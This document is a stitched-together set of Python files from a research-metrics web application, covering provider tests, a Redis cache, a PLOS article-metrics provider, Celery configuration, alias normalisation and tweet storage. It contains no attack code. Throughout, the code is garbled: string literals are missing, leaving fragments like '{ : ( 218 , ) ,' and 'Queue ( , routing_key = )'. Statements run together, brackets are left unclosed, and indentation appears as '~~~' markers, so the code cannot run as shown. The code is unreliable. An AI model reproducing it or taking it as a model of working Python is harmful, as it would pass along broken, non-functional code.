~~~ assert metrics_dict [ key ] [ 0 ] >= expected [ key ] [ 0 ] , [ key , metrics_dict [ key ] , expected [ key ] ] assert metrics_dict [ key ] [ 1 ] == expected [ key ] [ 1 ] , [ key , metrics_dict [ key ] , expected [ key ] ] \n 
~~ ~~ @ http \n 
def test_metrics_multiple_months ( self ) : \n 
~~~ metrics_dict = self . provider . metrics ( [ ( "pmid" , "111" ) ] ) \n 
expected = { : ( 218 , ) , : ( 810 , ) , print metrics_dict \n 
for key in expected : \n 
~~~ assert metrics_dict [ key ] [ 0 ] >= expected [ key ] [ 0 ] , [ key , metrics_dict [ key ] , expected [ key ] ] assert metrics_dict [ key ] [ 1 ] == expected [ key ] [ 1 ] , [ key , metrics_dict [ key ] , expected [ key ] ] \n 
~~ ~~ @ http \n 
def test_metrics_real ( self ) : \n 
~~~ metrics_dict = self . provider . metrics ( [ ( "pmid" , "23066504" ) ] ) \n 
expected = { : ( 119 , ) , : ( 722 , ) , print metrics_dict \n 
for key in expected : \n 
~~~ assert metrics_dict [ key ] [ 0 ] >= expected [ key ] [ 0 ] , [ key , metrics_dict [ key ] , expected [ key ] ] assert metrics_dict [ key ] [ 1 ] == expected [ key ] [ 1 ] , [ key , metrics_dict [ key ] , expected [ key ] ] \n 
~~ ~~ ~~ import os \n 
import sys \n 
import hashlib \n 
import logging \n 
import json \n 
from cPickle import PicklingError \n 
import redis \n 
\n 
from totalimpact import REDIS_CACHE_DATABASE_NUMBER \n 
\n 
# set up logging \n 
logger = logging . getLogger ( "ti.cache" ) \n 
\n 
cache_client = redis . from_url ( os . getenv ( "REDIS_URL" ) , REDIS_CACHE_DATABASE_NUMBER ) \n 
\n 
MAX_PAYLOAD_SIZE_BYTES = 1000 * 1000 # 1mb \n 
MAX_CACHE_SIZE_BYTES = 100 * 1000 * 1000 #100mb \n 
\n 
class CacheException ( Exception ) : \n 
~~~ pass \n 
\n 
~~ class Cache ( object ) : \n 
~~~ """ Maintains a cache of URL responses in memcached """ \n 
\n 
def _build_hash_key ( self , key ) : \n 
~~~ json_key = json . dumps ( key ) \n 
hash_key = hashlib . md5 ( json_key . encode ( "utf-8" ) ) . hexdigest ( ) \n 
return hash_key \n 
\n 
~~ def _get_client ( self ) : \n 
~~~ return cache_client \n 
\n 
~~ def __init__ ( self , max_cache_age = 60 * 60 ) : #one hour \n 
~~~ self . max_cache_age = max_cache_age \n 
self . flush_cache ( ) \n 
\n 
~~ def flush_cache ( self ) : \n 
#empties the cache \n 
~~~ mc = self . _get_client ( ) \n 
# mc.flushdb() \n 
\n 
~~ def get_cache_entry ( self , key ) : \n 
~~~ """ Get an entry from the cache, returns None if not found """ \n 
mc = self . _get_client ( ) \n 
hash_key = self . _build_hash_key ( key ) \n 
response = mc . get ( hash_key ) \n 
if response : \n 
~~~ response = json . loads ( response ) \n 
~~ return response \n 
\n 
~~ def set_cache_entry ( self , key , data ) : \n 
~~~ """ Store a cache entry """ \n 
\n 
if sys . getsizeof ( data [ "text" ] ) > MAX_PAYLOAD_SIZE_BYTES : \n 
~~~ logger . debug ( u"Not caching because payload is too large" ) \n 
return None \n 
\n 
~~ mc = self . _get_client ( ) \n 
\n 
if mc . info ( ) [ "used_memory" ] >= MAX_CACHE_SIZE_BYTES : \n 
~~~ logger . debug ( u"Not caching because redis cache is too full" ) \n 
return None \n 
\n 
~~ hash_key = self . _build_hash_key ( key ) \n 
set_response = mc . set ( hash_key , json . dumps ( data ) ) \n 
mc . expire ( hash_key , self . max_cache_age ) \n 
\n 
if not set_response : \n 
~~~ logger . warning ( "Unable to store into Redis. Make sure redis server is running." ) \n 
raise CacheException ( "Unable to store into Redis. Make sure redis server is running." ) \n 
~~ return set_response \n 
\n 
~~ ~~ from totalimpact . providers import provider \n 
from totalimpact . providers . provider import Provider , ProviderContentMalformedError \n 
\n 
import simplejson , os , re , urllib \n 
\n 
import logging \n 
logger = logging . getLogger ( ) \n 
\n 
class Plosalm ( Provider ) : \n 
\n 
~~~ example_id = ( "doi" , "10.1371/journal.pcbi.1000361" ) \n 
\n 
url = "http://www.plos.org/" \n 
descr = "PLOS article level metrics." \n 
metrics_url_template = "http://alm.plos.org/api/v3/articles?ids=%s&source=citations,counter&api_key=" provenance_url_template = "http://dx.doi.org/%s" \n 
\n 
PLOS_ICON = "http://www.plos.org/wp-content/themes/plos_new/favicon.ico" \n 
\n 
static_meta_dict = { \n 
"html_views" : { \n 
"display_name" : "html views" , \n 
"provider" : "PLOS" , \n 
"provider_url" : "http://www.plos.org/" , \n 
"description" : "the number of views of the HTML article on PLOS" , \n 
"icon" : PLOS_ICON , \n 
} , \n 
"pdf_views" : { \n 
"display_name" : "pdf views" , \n 
"provider" : "PLOS" , \n 
"provider_url" : "http://www.plos.org/" , \n 
"description" : "the number of downloads of the PDF from PLOS" , \n 
"icon" : PLOS_ICON , \n 
} \n 
} \n 
\n 
\n 
def __init__ ( self ) : \n 
~~~ super ( Plosalm , self ) . __init__ ( ) \n 
\n 
~~ def is_relevant_alias ( self , alias ) : \n 
~~~ ( namespace , nid ) = alias \n 
relevant = ( ( "doi" == namespace ) and ( "10.1371/" in nid ) ) \n 
return ( relevant ) \n 
\n 
~~ def _extract_metrics ( self , page , status_code = 200 , id = None ) : \n 
~~~ if status_code != 200 : \n 
~~~ if status_code == 404 : \n 
~~~ return { } \n 
~~ else : \n 
~~~ raise ( self . _get_error ( status_code ) ) \n 
\n 
~~ ~~ if not "sources" in page : \n 
~~~ raise ProviderContentMalformedError \n 
\n 
~~ json_response = provider . _load_json ( page ) \n 
this_article = json_response [ 0 ] [ "sources" ] [ 0 ] [ "metrics" ] \n 
\n 
dict_of_keylists = { \n 
: [ ] , \n 
: [ ] \n 
} \n 
\n 
metrics_dict = provider . _extract_from_data_dict ( this_article , dict_of_keylists ) \n 
\n 
return metrics_dict \n 
\n 
\n 
~~ ~~ import os \n 
import sys \n 
import urlparse \n 
from kombu import Exchange , Queue \n 
\n 
sys . path . append ( ) \n 
\n 
redis_url = os . environ . get ( , "redis://127.0.0.1:6379/" ) \n 
if not redis_url . endswith ( "/" ) : \n 
~~~ redis_url += "/" \n 
\n 
~~ BROKER_URL = redis_url + "1" # REDIS_CELERY_TASKS_DATABASE_NUMBER = 1 \n 
CELERY_RESULT_BACKEND = redis_url + "2" # REDIS_CELERY_RESULTS_DATABASE_NUMBER = 2 \n 
REDIS_CONNECT_RETRY = True \n 
\n 
\n 
# fanout options will be defaults in future as per http://celery.readthedocs.org/en/latest/getting-started/brokers/redis.html BROKER_TRANSPORT_OPTIONS = { : True , \n 
: True , \n 
: 60 , # one minute \n 
: 100 # max redis connections for tasks. see https://github.com/celery/celery/issues/1350 } \n 
\n 
\n 
CELERY_DEFAULT_QUEUE = \n 
CELERY_QUEUES = [ \n 
Queue ( , routing_key = ) , \n 
Queue ( , routing_key = ) \n 
] \n 
\n 
# added because https://github.com/celery/celery/issues/896 \n 
BROKER_POOL_LIMIT = None \n 
\n 
CELERY_CREATE_MISSING_QUEUES = True \n 
\n 
CELERY_ACCEPT_CONTENT = [ , ] \n 
CELERY_ENABLE_UTC = True \n 
CELERY_TASK_RESULT_EXPIRES = 60 * 60 * 1 # 1 hour \n 
\n 
CELERY_ACKS_LATE = True \n 
\n 
# remove this, might fix deadlocks as per https://github.com/celery/celery/issues/970 \n 
# CELERYD_MAX_TASKS_PER_CHILD = 100 \n 
\n 
CELERYD_FORCE_EXECV = True \n 
CELERY_TRACK_STARTED = True \n 
\n 
# https://groups.google.com/forum/#!topic/celery-users/Y_ifty2l6Fc \n 
CELERYD_PREFETCH_MULTIPLIER = 1 \n 
\n 
# List of modules to import when celery starts. \n 
CELERY_IMPORTS = ( "core_tasks" , ) \n 
\n 
CELERY_ANNOTATIONS = { \n 
: { : 60 * 2 } # 2 minutes \n 
} \n 
\n 
from totalimpact . providers import provider \n 
from totalimpact . providers . provider import Provider , ProviderFactory \n 
from totalimpactwebapp import app , db \n 
from nose . tools import assert_equals , nottest \n 
from xml . dom import minidom \n 
from test . utils import setup_postgres_for_unittests , teardown_postgres_for_unittests \n 
\n 
import simplejson , BeautifulSoup \n 
import os \n 
from sqlalchemy . sql import text \n 
\n 
sampledir = os . path . join ( os . path . split ( __file__ ) [ 0 ] , "../../../extras/sample_provider_pages/" ) \n 
\n 
class Test_Provider ( ) : \n 
\n 
~~~ TEST_PROVIDER_CONFIG = [ \n 
( "pubmed" , { "workers" : 1 } ) , \n 
( "wikipedia" , { "workers" : 3 } ) , \n 
( "mendeley" , { "workers" : 3 } ) , \n 
] \n 
\n 
TEST_JSON = """{"repository":{"homepage":"","watchers":7,"has_downloads":true,"fork":false,"language":"Java","has_issues":true,"has_wiki":true,"forks":0,"size":4480,"private":false,"created_at":"2008/09/29 04:26:42 -0700","name":"gtd","owner":"egonw","description":"Git-based ToDo tool.","open_issues":2,"url":"https://github.com/egonw/gtd","pushed_at":"2012/02/28 10:21:26 -0800"}}""" \n 
TEST_XML = open ( os . path . join ( sampledir , "facebook" , "metrics" ) ) . read ( ) \n 
\n 
def setUp ( self ) : \n 
~~~ self . db = setup_postgres_for_unittests ( db , app ) \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ teardown_postgres_for_unittests ( self . db ) \n 
\n 
~~ def test_get_provider ( self ) : \n 
~~~ provider = ProviderFactory . get_provider ( "wikipedia" ) \n 
assert_equals ( provider . __class__ . __name__ , "Wikipedia" ) \n 
\n 
~~ def test_get_providers ( self ) : \n 
~~~ providers = ProviderFactory . get_providers ( self . TEST_PROVIDER_CONFIG ) \n 
provider_names = [ provider . __class__ . __name__ for provider in providers ] \n 
assert_equals ( set ( provider_names ) , set ( [ , , "Pubmed" ] ) ) \n 
\n 
~~ def test_get_providers_filters_by_metrics ( self ) : \n 
# since all the providers do metrics, "metrics" arg changes nought. \n 
~~~ providers = ProviderFactory . get_providers ( self . TEST_PROVIDER_CONFIG , "metrics" ) \n 
provider_names = [ provider . __class__ . __name__ for provider in providers ] \n 
assert_equals ( set ( provider_names ) , set ( [ , , "Pubmed" ] ) ) \n 
\n 
~~ def test_get_providers_filters_by_biblio ( self ) : \n 
~~~ providers = ProviderFactory . get_providers ( self . TEST_PROVIDER_CONFIG , "biblio" ) \n 
provider_names = [ provider . __class__ . __name__ for provider in providers ] \n 
assert_equals ( set ( provider_names ) , set ( [ , ] ) ) \n 
\n 
~~ def test_get_providers_filters_by_aliases ( self ) : \n 
~~~ providers = ProviderFactory . get_providers ( self . TEST_PROVIDER_CONFIG , "aliases" ) \n 
provider_names = [ provider . __class__ . __name__ for provider in providers ] \n 
assert_equals ( set ( provider_names ) , set ( [ , ] ) ) \n 
\n 
~~ def test_lookup_json ( self ) : \n 
~~~ page = self . TEST_JSON \n 
data = simplejson . loads ( page ) \n 
response = provider . _lookup_json ( data , [ , ] ) \n 
assert_equals ( response , ) \n 
\n 
~~ def test_extract_json ( self ) : \n 
~~~ page = self . TEST_JSON \n 
dict_of_keylists = { \n 
: [ , ] , \n 
: [ , ] } \n 
\n 
response = provider . _extract_from_json ( page , dict_of_keylists ) \n 
assert_equals ( response , { : , : } ) \n 
\n 
~~ def test_lookup_xml_from_dom ( self ) : \n 
~~~ page = self . TEST_XML \n 
doc = minidom . parseString ( page . strip ( ) ) \n 
response = provider . _lookup_xml_from_dom ( doc , [ ] ) \n 
assert_equals ( response , 17 ) \n 
\n 
~~ def test_lookup_xml_from_soup ( self ) : \n 
~~~ page = self . TEST_XML \n 
doc = BeautifulSoup . BeautifulStoneSoup ( page ) \n 
response = provider . _lookup_xml_from_soup ( doc , [ ] ) \n 
assert_equals ( response , 17 ) \n 
\n 
~~ def test_extract_xml ( self ) : \n 
~~~ page = self . TEST_XML \n 
dict_of_keylists = { \n 
: [ ] } \n 
\n 
response = provider . _extract_from_xml ( page , dict_of_keylists ) \n 
assert_equals ( response , { : 17 } ) \n 
\n 
~~ def test_doi_from_url_string ( self ) : \n 
~~~ test_url = "https://knb.ecoinformatics.org/knb/d1/mn/v1/object/doi:10.5063%2FAA%2Fnrs.373.1" expected = "10.5063/AA/nrs.373.1" \n 
response = provider . doi_from_url_string ( test_url ) \n 
assert_equals ( response , expected ) \n 
\n 
~~ def test_is_issn_in_doaj_false ( self ) : \n 
~~~ response = provider . is_issn_in_doaj ( "invalidissn" ) \n 
assert_equals ( response , False ) \n 
\n 
~~ def test_is_issn_in_doaj_true ( self ) : \n 
~~~ zookeys_issn = "13132989" #this one is in test setup \n 
response = provider . is_issn_in_doaj ( zookeys_issn ) \n 
assert_equals ( response , True ) \n 
\n 
~~ def test_import_products ( self ) : \n 
~~~ response = provider . import_products ( "product_id_strings" , \n 
{ "product_id_strings" : [ "123456" , "HTTPS://starbucks.com" , "arXiv:1305.3328" , "http://doi.org/10.123/ABC" expected = [ ( , ) , ( , ) , ( , ) , ( assert_equals ( response , expected ) \n 
\n 
~~ def test_import_products_bad_providername ( self ) : \n 
~~~ response = provider . import_products ( "nonexistant" , { } ) \n 
expected = [ ] \n 
assert_equals ( response , expected ) \n 
\n 
\n 
\n 
~~ ~~ class TestProviderFactory ( ) : \n 
\n 
~~~ TEST_PROVIDER_CONFIG = [ \n 
( "pubmed" , { "workers" : 1 } ) , \n 
( "wikipedia" , { "workers" : 3 } ) , \n 
( "mendeley" , { "workers" : 3 } ) , \n 
] \n 
\n 
def test_get_all_static_meta ( self ) : \n 
~~~ sm = ProviderFactory . get_all_static_meta ( self . TEST_PROVIDER_CONFIG ) \n 
expected = \n 
assert_equals ( sm [ "pubmed:pmc_citations" ] [ "description" ] , expected ) \n 
\n 
~~ def test_get_all_metric_names ( self ) : \n 
~~~ response = ProviderFactory . get_all_metric_names ( self . TEST_PROVIDER_CONFIG ) \n 
expected = [ , , , assert_equals ( response , expected ) \n 
\n 
~~ def test_get_all_metadata ( self ) : \n 
~~~ md = ProviderFactory . get_all_metadata ( self . TEST_PROVIDER_CONFIG ) \n 
print md [ "pubmed" ] \n 
assert_equals ( md [ "pubmed" ] [ ] , ) \n 
\n 
~~ ~~ import datetime \n 
import copy \n 
import unicode_helpers \n 
import json \n 
import logging \n 
\n 
from util import cached_property \n 
from util import dict_from_dir \n 
from totalimpactwebapp import db \n 
\n 
logger = logging . getLogger ( "ti.aliases" ) \n 
\n 
\n 
def clean_id ( nid ) : \n 
~~~ try : \n 
~~~ nid = nid . strip ( \' "\' ) . strip ( ) \n 
nid = unicode_helpers . remove_nonprinting_characters ( nid ) \n 
~~ except ( TypeError , AttributeError ) : \n 
\n 
~~~ pass \n 
~~ return ( nid ) \n 
\n 
\n 
~~ def normalize_alias_tuple ( ns , nid ) : \n 
~~~ ns = clean_id ( ns ) \n 
ns = ns . lower ( ) \n 
\n 
if ns == "biblio" : \n 
~~~ return ( ns , nid ) \n 
\n 
~~ nid = clean_id ( nid ) \n 
\n 
from totalimpact . providers import crossref \n 
from totalimpact . providers import pubmed \n 
from totalimpact . providers import arxiv \n 
from totalimpact . providers import webpage \n 
from totalimpact import importer \n 
\n 
clean_nid = None \n 
if ns == "doi" or importer . is_doi ( nid ) : \n 
~~~ ns = "doi" \n 
clean_nid = crossref . clean_doi ( nid ) \n 
~~ elif ns == "pmid" or importer . is_pmid ( nid ) : \n 
~~~ ns = "pmid" \n 
clean_nid = pubmed . clean_pmid ( nid ) \n 
~~ elif ns == "arxiv" or importer . is_arxiv ( nid ) : \n 
~~~ ns = "arxiv" \n 
clean_nid = arxiv . clean_arxiv_id ( nid ) \n 
~~ elif ns == "url" or importer . is_url ( nid ) : \n 
~~~ ns = "url" \n 
clean_nid = webpage . clean_url ( nid ) \n 
~~ elif ns not in [ "doi" , "pmid" , "arxiv" , "url" ] : \n 
~~~ clean_nid = nid \n 
\n 
~~ if not clean_nid : \n 
~~~ return None \n 
\n 
~~ return ( ns , clean_nid ) \n 
\n 
\n 
~~ def clean_alias_tuple_for_comparing ( ns , nid ) : \n 
~~~ alias_tuple = normalize_alias_tuple ( ns , nid ) \n 
if not alias_tuple : \n 
~~~ return None \n 
~~ try : \n 
~~~ ( ns , nid ) = alias_tuple \n 
cleaned_alias = ( ns . lower ( ) , nid . lower ( ) ) \n 
~~ except AttributeError : \n 
~~~ logger . debug ( u"problem cleaning {ns} {nid}" . format ( \n 
ns = ns , nid = nid ) ) \n 
cleaned_alias = ( ns , nid ) \n 
~~ return cleaned_alias \n 
\n 
\n 
~~ def alias_tuples_from_dict ( aliases_dict ) : \n 
~~~ """\n    Convert from aliases dict we use in items, to a list of alias tuples.\n\n    The providers need the tuples list, which look like this:\n    [(doi, 10.123), (doi, 10.345), (pmid, 1234567)]\n    """ \n 
alias_tuples = [ ] \n 
for ns , ids in aliases_dict . iteritems ( ) : \n 
~~~ if isinstance ( ids , basestring ) : \n 
~~~ alias_tuples . append ( ( ns , ids ) ) \n 
~~ else : \n 
~~~ for id in ids : \n 
~~~ alias_tuples . append ( ( ns , id ) ) \n 
~~ ~~ ~~ return alias_tuples \n 
\n 
\n 
~~ def alias_dict_from_tuples ( aliases_tuples ) : \n 
~~~ alias_dict = { } \n 
for ( ns , ids ) in aliases_tuples : \n 
~~~ if ns in alias_dict : \n 
~~~ alias_dict [ ns ] += [ ids ] \n 
~~ else : \n 
~~~ alias_dict [ ns ] = [ ids ] \n 
~~ ~~ return alias_dict \n 
\n 
\n 
~~ def canonical_aliases ( orig_aliases_dict ) : \n 
# only put lowercase namespaces in items, and lowercase dois \n 
~~~ lowercase_aliases_dict = { } \n 
for orig_namespace in orig_aliases_dict : \n 
~~~ lowercase_namespace = clean_id ( orig_namespace . lower ( ) ) \n 
if lowercase_namespace == "doi" : \n 
~~~ lowercase_aliases_dict [ lowercase_namespace ] = [ clean_id ( doi . lower ( ) ) for doi in orig_aliases_dict ~~ else : \n 
~~~ lowercase_aliases_dict [ lowercase_namespace ] = [ clean_id ( nid ) for nid in orig_aliases_dict ~~ ~~ return lowercase_aliases_dict \n 
\n 
\n 
~~ def merge_alias_dicts ( aliases1 , aliases2 ) : \n 
#logger.debug(u"in MERGE ALIAS DICTS with %s and %s" %(aliases1, aliases2)) \n 
~~~ merged_aliases = copy . deepcopy ( aliases1 ) \n 
for ns , nid_list in aliases2 . iteritems ( ) : \n 
~~~ for nid in nid_list : \n 
~~~ try : \n 
~~~ if not nid in merged_aliases [ ns ] : \n 
~~~ merged_aliases [ ns ] . append ( nid ) \n 
~~ ~~ except KeyError : # no ids for that namespace yet. make it. \n 
~~~ merged_aliases [ ns ] = [ nid ] \n 
~~ ~~ ~~ return merged_aliases \n 
\n 
~~ def matches_alias ( product1 , product2 , exclude = [ ] ) : \n 
~~~ alias_tuple_list1 = [ alias_row . my_alias_tuple_for_comparing for alias_row in product1 . alias_rows alias_tuple_list2 = [ alias_row . my_alias_tuple_for_comparing for alias_row in product2 . alias_rows has_matches = False \n 
for alias_tuple1 in alias_tuple_list1 : \n 
~~~ if alias_tuple1 : \n 
~~~ ( ns , nid ) = alias_tuple1 \n 
if alias_tuple1 in alias_tuple_list2 and ns not in exclude : \n 
~~~ has_matches = True \n 
~~ ~~ ~~ return has_matches \n 
\n 
\n 
\n 
~~ class AliasRow ( db . Model ) : \n 
\n 
~~~ __tablename__ = \n 
\n 
tiid = db . Column ( db . Text , db . ForeignKey ( ) , primary_key = True ) \n 
namespace = db . Column ( db . Text , primary_key = True ) \n 
nid = db . Column ( db . Text , primary_key = True ) \n 
collected_date = db . Column ( db . DateTime ( ) ) \n 
\n 
def __init__ ( self , ** kwargs ) : \n 
~~~ if "collected_date" not in kwargs : \n 
~~~ self . collected_date = datetime . datetime . utcnow ( ) \n 
\n 
~~ super ( AliasRow , self ) . __init__ ( ** kwargs ) \n 
\n 
~~ @ cached_property \n 
def alias_tuple ( self ) : \n 
~~~ return ( self . namespace , self . nid ) \n 
\n 
~~ @ cached_property \n 
def my_alias_tuple_for_comparing ( self ) : \n 
~~~ return clean_alias_tuple_for_comparing ( self . namespace , self . nid ) \n 
\n 
~~ def is_equivalent_alias ( self , given_namespace , given_nid ) : \n 
~~~ if not given_nid : \n 
~~~ return False \n 
\n 
~~ given_clean_alias = clean_alias_tuple_for_comparing ( given_namespace , given_nid ) \n 
\n 
if not given_clean_alias : \n 
~~~ return False \n 
\n 
~~ return given_clean_alias == self . my_alias_tuple_for_comparing \n 
\n 
\n 
\n 
~~ ~~ class Aliases ( object ) : \n 
~~~ def __init__ ( self , alias_rows ) : \n 
~~~ ignore_namepaces = [ "biblio" ] \n 
self . tiid = None \n 
for alias_row in alias_rows : \n 
~~~ if alias_row . namespace not in ignore_namepaces : \n 
~~~ self . tiid = alias_row . tiid \n 
# each namespace has a list of various IDs. We can at some point \n 
# be smart about picking which on is best. For now we just \n 
# use the first one. \n 
try : \n 
~~~ getattr ( self , alias_row . namespace ) . append ( alias_row . nid ) \n 
~~ except AttributeError : \n 
~~~ setattr ( self , alias_row . namespace , [ alias_row . nid ] ) \n 
\n 
~~ ~~ ~~ ~~ @ cached_property \n 
def best_url ( self ) : \n 
# try these first, in this order \n 
~~~ if self . display_doi : \n 
~~~ return u"http://doi.org/" + self . display_doi \n 
~~ if self . display_pmid : \n 
~~~ return u"http://www.ncbi.nlm.nih.gov/pubmed/" + self . display_pmid \n 
~~ if self . display_pmc : \n 
~~~ return u"http://www.ncbi.nlm.nih.gov/pmc/articles/" + self . display_pmc \n 
~~ if self . resolved_url : \n 
~~~ return self . resolved_url \n 
\n 
~~ try : \n 
~~~ return self . url [ 0 ] \n 
~~ except AttributeError : \n 
~~~ return None \n 
\n 
\n 
~~ ~~ @ cached_property \n 
def display_best_url ( self ) : # for consistency \n 
~~~ return self . best_url \n 
\n 
~~ @ cached_property \n 
def display_pmid ( self ) : \n 
~~~ try : \n 
~~~ return self . pmid [ 0 ] \n 
~~ except AttributeError : \n 
~~~ return None \n 
\n 
~~ ~~ @ cached_property \n 
def display_pmc ( self ) : \n 
~~~ try : \n 
~~~ return self . pmc [ 0 ] \n 
~~ except AttributeError : \n 
~~~ return None \n 
\n 
~~ ~~ @ cached_property \n 
def display_doi ( self ) : \n 
~~~ try : \n 
~~~ return self . doi [ 0 ] \n 
~~ except AttributeError : \n 
~~~ return None \n 
\n 
~~ ~~ @ cached_property \n 
def display_arxiv ( self ) : \n 
~~~ try : \n 
~~~ return self . arxiv [ 0 ] \n 
~~ except AttributeError : \n 
~~~ return None \n 
\n 
~~ ~~ @ cached_property \n 
def has_formal_alias ( self ) : \n 
# has something other than urls and mendeley uuids etc \n 
~~~ if self . display_arxiv or self . display_doi or self . display_pmid or self . display_pmc : \n 
~~~ return True \n 
~~ else : \n 
~~~ return False \n 
\n 
~~ ~~ @ cached_property \n 
def resolved_url ( self ) : \n 
~~~ try : \n 
~~~ for url in self . url : \n 
~~~ if "doi.org" in url : \n 
~~~ continue \n 
~~ elif "ncbi.nlm.nih.gov/" in url : \n 
~~~ continue \n 
~~ elif "europepmc.org" in url : \n 
~~~ continue \n 
~~ elif "mendeley.com" in url : \n 
~~~ continue \n 
~~ elif "scopus.com" in url : \n 
~~~ continue \n 
~~ else : \n 
~~~ return url \n 
\n 
# only had those, so return one of those \n 
~~ ~~ return self . url [ 0 ] \n 
~~ except AttributeError : \n 
~~~ return None \n 
\n 
\n 
~~ ~~ def get_genre ( self ) : \n 
~~~ return self . _guess_genre_and_host_from_aliases ( ) [ 0 ] \n 
\n 
~~ def get_host ( self ) : \n 
~~~ return self . _guess_genre_and_host_from_aliases ( ) [ 1 ] \n 
\n 
\n 
\n 
~~ def _guess_genre_and_host_from_aliases ( self ) : \n 
~~~ """Uses available aliases to decide the item\'s genre""" \n 
\n 
# logger.debug(u"in decide_genre with {alias_dict}".format( \n 
#     alias_dict=alias_dict)) \n 
\n 
genre = "unknown" \n 
host = "unknown" \n 
\n 
if hasattr ( self , "doi" ) : \n 
~~~ joined_doi_string = "" . join ( self . doi ) . lower ( ) \n 
if "10.5061/dryad." in joined_doi_string : \n 
~~~ genre = "dataset" \n 
host = "dryad" \n 
~~ elif ".figshare." in joined_doi_string : \n 
\n 
~~~ host = "figshare" \n 
genre = "dataset" \n 
~~ else : \n 
~~~ genre = "article" \n 
\n 
~~ ~~ elif hasattr ( self , "pmid" ) : \n 
~~~ genre = "article" \n 
\n 
~~ elif hasattr ( self , "arxiv" ) : \n 
~~~ genre = "article" \n 
host = "arxiv" \n 
\n 
~~ elif hasattr ( self , "blog" ) : \n 
~~~ genre = "blog" \n 
host = "wordpresscom" \n 
\n 
~~ elif hasattr ( self , "blog_post" ) : \n 
~~~ genre = "blog" \n 
host = "blog_post" \n 
\n 
~~ elif hasattr ( self , "url" ) : \n 
~~~ joined_url_string = "" . join ( self . url ) . lower ( ) \n 
if "slideshare.net" in joined_url_string : \n 
~~~ genre = "slides" \n 
host = "slideshare" \n 
~~ elif "github.com" in joined_url_string : \n 
~~~ genre = "software" \n 
host = "github" \n 
~~ elif ( "youtube.com" in joined_url_string ) or ( "youtu.be" in joined_url_string ) : \n 
~~~ genre = "video" \n 
host = "youtube" \n 
~~ elif "vimeo.com" in joined_url_string : \n 
~~~ genre = "video" \n 
host = "vimeo" \n 
~~ else : \n 
~~~ genre = "webpage" \n 
\n 
~~ ~~ return genre , host \n 
\n 
\n 
~~ def to_dict ( self ) : \n 
~~~ ret = dict_from_dir ( self ) \n 
return ret \n 
~~ ~~ from totalimpactwebapp import json_sqlalchemy \n 
from util import commit \n 
from util import cached_property \n 
from util import dict_from_dir \n 
from util import as_int_or_float_if_possible \n 
from totalimpactwebapp import db \n 
from totalimpactwebapp . tweeter import Tweeter \n 
\n 
from birdy . twitter import AppClient , TwitterApiError , TwitterRateLimitError , TwitterClientError \n 
from collections import defaultdict \n 
from sqlalchemy import case \n 
import os \n 
import re \n 
import datetime \n 
import logging \n 
logger = logging . getLogger ( ) \n 
\n 
def tweets_from_tiids ( tiids ) : \n 
~~~ if not tiids : \n 
~~~ return [ ] \n 
~~ tweets = db . session . query ( Tweet ) . filter ( Tweet . tiid . in_ ( tiids ) ) . all ( ) \n 
return tweets \n 
\n 
~~ def get_product_tweets_for_profile ( profile_id ) : \n 
~~~ tweets = db . session . query ( Tweet ) . filter ( Tweet . profile_id == profile_id ) . all ( ) \n 
response = defaultdict ( list ) \n 
for tweet in tweets : \n 
~~~ if tweet . tiid and tweet . tweet_text : \n 
~~~ response [ tweet . tiid ] . append ( tweet ) \n 
~~ ~~ return response \n 
\n 
\n 
~~ def store_tweet_payload_and_tweeter_from_twitter ( payload_dicts_from_twitter , tweets ) : \n 
~~~ tweets_by_tweet_id = defaultdict ( list ) \n 
for tweet in tweets : \n 
~~~ tweets_by_tweet_id [ tweet . tweet_id ] . append ( tweet ) \n 
\n 
~~ for payload_dict in payload_dicts_from_twitter : \n 
~~~ tweet_id = payload_dict [ "id_str" ] \n 
logger . debug ( "saving unsaved parts for tweet_id {tweet_id}" . format ( \n 
tweet_id = tweet_id ) ) \n 
for tweet in tweets_by_tweet_id [ tweet_id ] : \n 
~~~ if not tweet . payload : \n 
~~~ tweet . payload = payload_dict \n 
logger . info ( u"updated tweet payload for {tweet_id} {tiid}" . format ( \n 
tweet_id = tweet_id , tiid = tweet . tiid ) ) \n 
if "user" in payload_dict : \n 
~~~ try : \n 
~~~ tweet . tweeter . set_attributes_from_twitter_data ( payload_dict [ "user" ] ) \n 
~~ except AttributeError : \n 
~~~ tweeter = Tweeter . query . get ( tweet . screen_name ) \n 
if not tweeter : \n 
~~~ tweeter = Tweeter ( screen_name = tweet . screen_name ) \n 
db . session . add ( tweeter ) \n 
~~ tweeter . set_attributes_from_twitter_data ( payload_dict [ "user" ] ) \n 
tweet . tweeter = tweeter \n 
commit ( db ) \n 
~~ if tweet . tweeter : \n 
~~~ logger . info ( u"updated tweeter followers for {screen_name}" . format ( \n 
screen_name = tweet . tweeter . screen_name ) ) \n 
\n 
\n 
~~ ~~ ~~ ~~ ~~ ~~ def flag_deleted_tweets ( tweet_ids ) : \n 
~~~ if not tweet_ids : \n 
~~~ return None \n 
~~ for tweet in Tweet . query . filter ( Tweet . tweet_id . in_ ( tweet_ids ) ) . all ( ) : \n 
# logger.debug("deleted tweet {tweet_id}".format( \n 
#     tweet_id=tweet_id)) \n 
~~~ tweet . is_deleted = True \n 
db . session . merge ( tweet ) \n 
\n 
\n 
~~ ~~ def handle_all_tweets ( data , tweets ) : \n 
# update with tweet text, tweeter \n 
~~~ store_tweet_payload_and_tweeter_from_twitter ( data , tweets ) \n 
tweet_ids = [ tweet . tweet_id for tweet in tweets ] \n 
\n 
# flag the rest as deleted \n 
tweet_ids_with_response = [ tweet [ "id_str" ] for tweet in data ] \n 
tweet_ids_without_response = [ tweet for tweet in tweet_ids if tweet not in tweet_ids_with_response flag_deleted_tweets ( tweet_ids_without_response ) \n 
return True \n 
\n 
\n 
\n 
# from https://github.com/inueni/birdy/issues/7 \n 
# to overrride JSONObject \n 
~~ class AppDictClient ( AppClient ) : \n 
~~~ @ staticmethod \n 
def get_json_object_hook ( data ) : \n 
~~~ return data \n 
\n 
\n 
~~ ~~ def get_and_save_tweet_text_and_tweeter_followers ( tweets ) : \n 
\n 
~~~ client = AppDictClient ( \n 
os . getenv ( "TWITTER_CONSUMER_KEY" ) , \n 
os . getenv ( "TWITTER_CONSUMER_SECRET" ) , \n 
access_token = os . getenv ( "TWITTER_ACCESS_TOKEN" ) \n 
) \n 
\n 
logger . info ( u"in get_and_save_tweet_text_and_tweeter_followers for {num} tweet_ids" . format ( \n 
num = len ( tweets ) ) ) \n 
\n 
# print "lenth of tweet_ids", len(tweet_ids) \n 
\n 
# from http://stackoverflow.com/a/1624988/596939 \n 
group_size = 100 \n 
list_of_groups = [ tweets [ i : i + group_size ] for i in range ( 0 , len ( tweets ) , group_size ) ] \n 
